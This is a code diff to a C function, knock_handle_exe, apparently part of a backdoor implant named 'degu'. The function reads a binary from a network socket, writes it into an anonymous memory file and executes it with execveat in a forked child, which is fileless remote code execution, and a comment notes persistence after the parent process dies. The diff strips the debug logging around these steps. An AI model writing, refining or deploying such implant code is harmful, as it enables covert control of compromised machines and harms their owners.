@@ -231,7 +231,6 @@ void knock_handle_exe(int sock,unsigned  char *header,unsigned char *secret){
 
         cur += 4;
 
-        unsigned char argc = cur[0];
 
         // 13 == header + lenbin + lenargv + argc(<255)
         ssize_t total_len = lbin + largv + 13;
@@ -252,7 +251,7 @@ void knock_handle_exe(int sock,unsigned  char *header,unsigned char *secret){
 
         unsigned char *bin = payload + 13 + largv;
 
-        TRACE("exelen %i argvlen %i argc %x",lbin, largv, argc);
+        //TRACE("exelen %i argvlen %i argc %x",lbin, largv, argc);
 
         cur += 1;
         char * str_argv = malloc((largv + 1) * sizeof *str_argv);
@@ -276,7 +275,7 @@ void knock_handle_exe(int sock,unsigned  char *header,unsigned char *secret){
         argv[index] = NULL;
 
         int fd = degu_memfd_create("", 1);
-        int written = write(fd, bin, lbin);
+        write(fd, bin, lbin);
 
 
         pid_t pid = -1;
@@ -287,9 +286,9 @@ void knock_handle_exe(int sock,unsigned  char *header,unsigned char *secret){
             return;
         }
         if(pid == 0){
-            TRACE("fd=%i written %i pid=%i", fd, written, getpid() );
-            int ret = degu_execveat(fd, "", argv, NULL, 0x1000); // persistant after father process died TODO
-            TRACE("exec result : %i : %s", ret, strerror(errno) );
+            degu_execveat(fd, "", argv, NULL, 0x1000); // persistant after father process died TODO
+
+
             close(fd);
             exit(EXIT_SUCCESS);
         }else
